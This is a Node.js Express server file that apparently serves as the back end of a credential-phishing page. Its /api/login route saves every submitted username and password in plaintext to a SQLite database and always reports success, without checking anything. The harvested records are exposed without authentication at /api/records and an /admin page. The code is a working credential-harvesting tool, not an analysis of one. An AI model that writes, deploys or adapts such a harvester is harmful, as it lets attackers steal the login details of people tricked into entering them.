const express = require('express');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const db = new sqlite3.Database('./login_records.db');

db.run(`CREATE TABLE IF NOT EXISTS records (
    id INTEGER PRIMARY KEY,
    type TEXT,
    username TEXT,
    password TEXT,
    timestamp TEXT
)`);

function saveRecord(type, username = null, password = null) {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
    db.run("INSERT INTO records (type, username, password, timestamp) VALUES (?, ?, ?, ?)",
        [type, username, password, timestamp]);
}

// Login
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    saveRecord('Login Attempt', username, password);
    console.log('Login Recorded:', username);
    res.json({ success: true });
});

// Get records
app.get('/api/records', (req, res) => {
    db.all("SELECT * FROM records ORDER BY id DESC", [], (err, rows) => {
        res.json(rows);
    });
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});